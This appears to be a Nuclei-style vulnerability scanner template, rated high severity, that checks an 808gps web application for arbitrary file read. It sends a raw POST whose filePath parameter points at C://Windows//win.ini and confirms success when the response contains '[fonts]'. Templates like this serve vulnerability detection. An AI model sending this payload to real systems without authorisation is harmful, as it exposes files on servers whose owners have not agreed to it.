id: msk-template

info:
  name: msk-template
  author: msk
  severity: high


http:
  - raw:
      - |
        POST /808gps/StandardReportMediaAction_getImage.action?filePath=C://Windows//win.ini&fileOffset=1&fileSize=100 HTTP/1.1
        Host: {{Hostname}}


    matchers:
      - type: dsl
        dsl:
          - status_code==200 && contains_all(body,"[fonts]")